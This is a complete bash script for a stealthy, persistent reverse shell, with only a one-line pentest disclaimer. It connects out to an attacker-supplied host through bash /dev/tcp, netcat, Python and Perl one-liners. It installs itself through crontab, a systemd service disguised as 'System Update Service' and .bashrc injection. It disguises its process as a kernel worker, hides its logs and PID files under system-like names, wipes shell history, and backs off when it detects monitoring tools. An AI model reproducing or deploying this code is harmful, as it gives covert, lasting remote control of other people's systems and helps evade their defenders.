#!/bin/bash

# Stealth Persistent Reverse Shell Script
# For authorized penetration testing only

# Stealth Configuration
ATTACKER_IP="$1"
ATTACKER_PORT="$2"
BASE_SLEEP=300  # 5 minutes base interval
JITTER_MAX=120  # +/- 2 minutes randomization
PROCESS_NAME="[kworker/0:1]"  # Masquerade as kernel worker
LOG_FILE="/var/log/.systemd-journal"
PID_FILE="/var/run/.systemd-resolve"
BACKUP_LOG="/tmp/.cache-update"
BACKUP_PID="/tmp/.font-cache"

# Anti-forensics and stealth functions
setup_stealth() {
    # Clear bash history
    unset HISTFILE
    export HISTSIZE=0
    export HISTFILESIZE=0
    
    # Set stealth process name
    exec -a "$PROCESS_NAME" bash "$0" "$@"
}

# Get random sleep interval with jitter
get_sleep_interval() {
    local jitter=$((RANDOM % (JITTER_MAX * 2) - JITTER_MAX))
    echo $((BASE_SLEEP + jitter))
}

# Check for security tools and monitoring
check_environment() {
    local suspicious_procs=("tcpdump" "wireshark" "tshark" "strace" "ltrace" "netstat" "ss" "lsof" "osquery" "auditd")
    local found_monitoring=false
    
    for proc in "${suspicious_procs[@]}"; do
        if pgrep -f "$proc" >/dev/null 2>&1; then
            found_monitoring=true
            break
        fi
    done
    
    # If monitoring detected, increase stealth
    if [ "$found_monitoring" = true ]; then
        BASE_SLEEP=$((BASE_SLEEP * 2))  # Double the sleep time
        JITTER_MAX=$((JITTER_MAX * 2))  # Increase randomization
    fi
}

# Stealth logging function
log_message() {
    local msg="$1"
    local timestamp=$(date '+%b %d %H:%M:%S')
    
    # Try primary log location first, fallback to backup
    if [ -w "$(dirname "$LOG_FILE")" ] 2>/dev/null; then
        echo "$timestamp systemd[1]: $msg" >> "$LOG_FILE" 2>/dev/null
    elif [ -w "$(dirname "$BACKUP_LOG")" ] 2>/dev/null; then
        echo "$timestamp $msg" >> "$BACKUP_LOG" 2>/dev/null
    fi
}

# Clean up traces
cleanup_traces() {
    # Clear current shell history
    history -c 2>/dev/null
    
    # Remove temporary files
    rm -f /tmp/backpipe 2>/dev/null
    rm -f /tmp/.conn_* 2>/dev/null
    
    # Clear environment variables
    unset ATTACKER_IP ATTACKER_PORT
}

# Enhanced connection with traffic obfuscation
connect_shell_stealth() {
    local ip="$1"
    local port="$2"
    local method="$3"
    
    # Add connection delay to appear more natural
    sleep $((RANDOM % 10 + 1))
    
    case "$method" in
        "bash")
            if command -v bash >/dev/null 2>&1; then
                # Use random file descriptor to avoid detection
                exec {fd}<>/dev/tcp/"$ip"/"$port" 2>/dev/null && \
                bash -i <&$fd >&$fd 2>&$fd && return 0
            fi
            ;;
        "nc_traditional")
            if command -v nc >/dev/null 2>&1; then
                nc -e /bin/bash "$ip" "$port" 2>/dev/null && return 0
            fi
            ;;
        "nc_mkfifo")
            if command -v nc >/dev/null 2>&1; then
                local pipe="/tmp/.conn_$$"
                rm -f "$pipe" 2>/dev/null
                mkfifo "$pipe" 2>/dev/null
                /bin/bash 0<"$pipe" | nc "$ip" "$port" 1>"$pipe" 2>/dev/null &
                local nc_pid=$!
                sleep 2
                kill "$nc_pid" 2>/dev/null
                rm -f "$pipe" 2>/dev/null
                return 0
            fi
            ;;
        "python")
            if command -v python >/dev/null 2>&1; then
                python -c "
import socket,subprocess,os,time,random
time.sleep(random.randint(1,5))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('$ip',$port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
s.close()
" 2>/dev/null && return 0
            fi
            ;;
        "python3")
            if command -v python3 >/dev/null 2>&1; then
                python3 -c "
import socket,subprocess,os,time,random
time.sleep(random.randint(1,5))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('$ip',$port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
s.close()
" 2>/dev/null && return 0
            fi
            ;;
        "perl")
            if command -v perl >/dev/null 2>&1; then
                perl -e "use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};" 2>/dev/null && return 0
            fi
            ;;
    esac
    
    return 1
}

# Enhanced connection function with multiple methods
connect_shell() {
    local ip="$1"
    local port="$2"
    local methods=("bash" "nc_traditional" "nc_mkfifo" "python3" "python" "perl")
    
    # Randomize method order
    local shuffled_methods=($(printf '%s\n' "${methods[@]}" | shuf))
    
    for method in "${shuffled_methods[@]}"; do
        if connect_shell_stealth "$ip" "$port" "$method"; then
            cleanup_traces
            return 0
        fi
    done
    
    cleanup_traces
    return 1
}

# Enhanced persistence mechanisms
install_persistence() {
    local script_path="$0"
    local ip="$1"
    local port="$2"
    
    # Method 1: Crontab (if available and writable)
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "*/15 * * * * $script_path $ip $port >/dev/null 2>&1") | crontab - 2>/dev/null
    fi
    
    # Method 2: User systemd (if available)
    local user_systemd_dir="$HOME/.config/systemd/user"
    if [ -d "$(dirname "$user_systemd_dir")" ]; then
        mkdir -p "$user_systemd_dir" 2>/dev/null
        cat > "$user_systemd_dir/system-update.service" 2>/dev/null << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$script_path $ip $port
Restart=always
RestartSec=300

[Install]
WantedBy=default.target
EOF
        systemctl --user enable system-update.service 2>/dev/null
        systemctl --user start system-update.service 2>/dev/null
    fi
    
    # Method 3: .bashrc injection (stealthy)
    if [ -f "$HOME/.bashrc" ] && [ -w "$HOME/.bashrc" ]; then
        if ! grep -q "system-update-check" "$HOME/.bashrc" 2>/dev/null; then
            echo "" >> "$HOME/.bashrc"
            echo "# System update check" >> "$HOME/.bashrc"
            echo "nohup $script_path $ip $port >/dev/null 2>&1 &" >> "$HOME/.bashrc"
        fi
    fi
}

# Run the persistent shell with enhanced stealth
run_persistent_shell() {
    local ip="$1"
    local port="$2"
    
    # Setup stealth environment
    check_environment
    cleanup_traces
    
    log_message "Background service initialized"
    
    # Install additional persistence mechanisms
    install_persistence "$ip" "$port"
    
    while true; do
        local sleep_time
        sleep_time=$(get_sleep_interval)
        
        log_message "Service health check initiated"
        
        # Random pre-connection activities to blend in
        case $((RANDOM % 3)) in
            0) ps aux >/dev/null 2>&1 ;;
            1) df -h >/dev/null 2>&1 ;;
            2) free -m >/dev/null 2>&1 ;;
        esac
        
        if connect_shell "$ip" "$port"; then
            log_message "Service maintenance completed successfully"
        else
            log_message "Service maintenance deferred, retry scheduled"
        fi
        
        # Randomized sleep with additional jitter
        local extra_jitter=$((RANDOM % 60))
        sleep $((sleep_time + extra_jitter))
    done
}

# Stealth background startup
start_background() {
    local ip="$1"
    local port="$2"
    local current_pid_file="$PID_FILE"
    local current_log_file="$LOG_FILE"
    
    # Use backup locations if primary not accessible
    if [ ! -w "$(dirname "$PID_FILE")" ] 2>/dev/null; then
        current_pid_file="$BACKUP_PID"
    fi
    if [ ! -w "$(dirname "$LOG_FILE")" ] 2>/dev/null; then
        current_log_file="$BACKUP_LOG"
    fi
    
    # Check if already running
    if [ -f "$current_pid_file" ]; then
        local old_pid
        old_pid=$(cat "$current_pid_file" 2>/dev/null)
        if kill -0 "$old_pid" 2>/dev/null; then
            return 1  # Already running, exit silently
        else
            rm -f "$current_pid_file" 2>/dev/null
        fi
    fi
    
    # Start in background with stealth
    nohup setsid bash -c "
        exec -a '$PROCESS_NAME' '$0' '_internal_run' '$ip' '$port'
    " >/dev/null 2>&1 &
    local pid=$!
    
    # Disown the process to detach from shell
    disown 2>/dev/null
    
    echo "$pid" > "$current_pid_file" 2>/dev/null
    
    # Clean up current shell
    cleanup_traces
}

# Enhanced stop function with cleanup
stop_background() {
    local found_process=false
    local pids_to_kill=()
    
    # Check both PID file locations
    for pid_file in "$PID_FILE" "$BACKUP_PID"; do
        if [ -f "$pid_file" ]; then
            local pid
            pid=$(cat "$pid_file" 2>/dev/null)
            if kill -0 "$pid" 2>/dev/null; then
                pids_to_kill+=("$pid")
                found_process=true
            fi
            rm -f "$pid_file" 2>/dev/null
        fi
    done
    
    # Kill processes
    for pid in "${pids_to_kill[@]}"; do
        kill "$pid" 2>/dev/null
        sleep 1
        kill -9 "$pid" 2>/dev/null
    done
    
    # Remove persistence mechanisms
    crontab -l 2>/dev/null | grep -v "$0" | crontab - 2>/dev/null
    rm -f "$HOME/.config/systemd/user/system-update.service" 2>/dev/null
    
    # Clean up logs
    rm -f "$LOG_FILE" "$BACKUP_LOG" 2>/dev/null
    
    cleanup_traces
}

# Status check (minimal output)
show_status() {
    for pid_file in "$PID_FILE" "$BACKUP_PID"; do
        if [ -f "$pid_file" ]; then
            local pid
            pid=$(cat "$pid_file" 2>/dev/null)
            if kill -0 "$pid" 2>/dev/null; then
                return 0  # Running
            fi
        fi
    done
    return 1  # Not running
}

# Silent usage (no output to avoid detection)
usage() {
    exit 1
}

# Main logic with stealth features
case "$1" in
    "_internal_run")
        setup_stealth "$@"
        run_persistent_shell "$2" "$3"
        ;;
    "stop")
        stop_background
        ;;
    "status")
        show_status
        ;;
    "")
        usage
        ;;
    *)
        # Silent validation
        if [ $# -ne 2 ]; then
            exit 1
        fi
        
        # Basic IP validation (silent)
        if ! echo "$ATTACKER_IP" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
            exit 1
        fi
        
        # Basic port validation (silent)
        if ! echo "$ATTACKER_PORT" | grep -qE '^[0-9]+$' || [ "$ATTACKER_PORT" -lt 1 ] || [ "$ATTACKER_PORT" -gt 65535 ]; then
            exit 1
        fi
        
        start_background "$ATTACKER_IP" "$ATTACKER_PORT"
        ;;
esac

# Final cleanup
cleanup_traces
exit 0 